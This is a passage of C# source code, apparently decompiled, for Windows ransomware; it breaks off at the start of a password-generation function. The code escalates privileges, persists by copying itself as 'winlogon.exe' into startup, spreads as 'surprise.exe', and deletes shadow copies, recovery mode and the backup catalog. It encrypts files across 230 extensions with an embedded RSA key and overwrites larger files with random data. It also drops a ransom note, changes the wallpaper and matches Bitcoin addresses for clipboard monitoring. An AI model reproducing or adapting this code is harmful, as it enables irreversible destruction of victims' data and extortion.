using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "winlogon.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 5;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAAAAAAAD/4QAuRXhpZgAATU0AKgAAAAgAAkAAAAMAAAABAFIAAEABAAEAAAABAAAAAAAAAAD/2wBDAAoHBwkHBgoJCAkLCwoMDxkQDw4ODx4WFxIZJCAmJSMgIyIoLTkwKCo2KyIjMkQyNjs9QEBAJjBGS0U+Sjk/QD3/2wBDAQsLCw8NDx0QEB09KSMpPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT3/wAARCAEKAdoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDxmiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACilFaq2kRhTKDaYyzS88N6enoMe9JuxrTpupsZNFa40uM8ZkXDYJYD5uM8e/H60DTIiM4mzt3CMAbhzip9ojX6pUMmitZdLj2vkuWGcdugz+lZrQSLEJCpCEkA+uKaknsZ1KE6aXN1IqKtWcKTy7HLAkELju3arg06IkgCV9pCMEwcHuf8/nQ5JMIUJTV0ZNLWo2lrtZgXYBCdw6ZBxUV7ax2yLtWUOwB+YYHTpQppsqWHnFOTM+lq5p0ImugpUsMHoMj8farVrpaSxL5olVj7cdcf1ockgp4edRJxMmitZtLjCcGReFO5h8vOOP1/ShNMjd0GJVDFlwQCeB1x/n60vaRK+qVL2MmitNLWF1nURzblxgYyRzzxSJpu6zZyrh8Fh9Acen1o50JYab2M2krYOnQpcJkS7RIqtu755qjewCG4Kqrqp6bxjNNSTInQlBXZWorSsIk+xTytEzuuAPlyBTGtz9iikWJvvHJ2/SjmK9g+VSvvqZ9L2rXksFku1DL5Y8oMQFxk45AoXTImlYZcgbQOMde2cUvaItYOo9jHoqRkxIV7g4rTfSkRYziQneEYDvkduKbkkZQoyne3QyKK1102FppEzIBGOQ3BbnGRx/jVG5iWG4aNSSoPUjFCmnoOdCUI8zK1L+NaraZEsStvYkhTkdOe3T3pTpcRbgyAAsNpHLEen5/pS9oi/qlRdjJorVXT4i0vyXGEUHGOfp/n8qYtpbNbmYGQKuQQSM57f59qOdE/Vpmb0oxmtdtMgjdS28LvUfPwGB9KRdNjeaXIdVXkKRgnnFHtEV9UqXsZIGaStqHTY0lJCvKCSv3eBx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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "bot.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[2] { "bomb has been planted", "" };

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ini"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xy1WrQW7tjHDqOS1ng2XrFOjph9GDNxvRWimwxD5ZYz9C4Eq9u2xC3550SH+agdQ6kyJpZgIsMDRZ+3qf2fjhhMIpBuJPKCjNK/QYc837vdirGFZx2LW0WfnA0fRTekc3o5M9K+Shs8Oh5er/fyh28v9iXg1Gs5RG3TkvCZSVH0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
